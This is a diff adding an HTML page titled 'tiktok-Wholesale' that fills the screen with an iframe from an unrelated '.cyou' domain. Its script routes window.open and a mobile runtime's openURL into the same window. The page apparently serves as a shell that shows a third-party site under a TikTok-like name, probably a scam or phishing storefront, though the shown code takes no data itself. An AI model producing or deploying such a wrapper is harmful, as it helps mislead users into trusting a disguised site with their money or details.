@@ -1,0 +1,58 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"> 
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <title>tiktok-Wholesale</title>
+    <style type="text/css">
+        html{overflow: hidden;}
+        body{margin: 0;padding: 0;}
+        #iframepage{width: 100%;}
+    </style>
+    <script type="text/javascript">
+      function ifssssssfillter(){
+    if(window.plus){
+        window.plus.runtime.openURL2=window.plus.runtime.openURL;
+        window.plus.runtime.openURL = function(url){
+            console.log('拦截window.plus.runtime.openURL',url);
+            window.location.href = url
+        }
+    }
+    if(window.open){
+        window.open2=window.open;
+        window.open = function(url){
+            console.log('拦截window.open',url);
+            window.location.href = url
+        }
+    }
+}
+        ifssssssfillter()
+</script>
+</head>
+<body>
+<iframe src="https://cbiliennef.cyou/wap" id="iframepage" scrolling="auto" onload="changeFrameHeight()" frameborder="0"></iframe>
+<script type="text/javascript">
+    function changeFrameHeight(){
+        var ifm= document.getElementById("iframepage");
+        ifm.height=document.documentElement.clientHeight;
+    }
+    window.onresize=function(){changeFrameHeight();}
+    var src='https://cbiliennef.cyou/'; 
+    console.log(navigator.userAgent)
+    	if (navigator.userAgent.match(/(iPhone|iPod|Android|ios|iPad)/i)) { 
+            src='https://cbiliennef.cyou/wap/';
+            document.getElementById("iframepage").src=src;
+        } 
+    
+    var action=window.location.hash.replace("#", "");
+    if(action){
+    	
+    	document.getElementById("iframepage").src=src+action;
+    }
+
+</script>
+</body>
+</html>
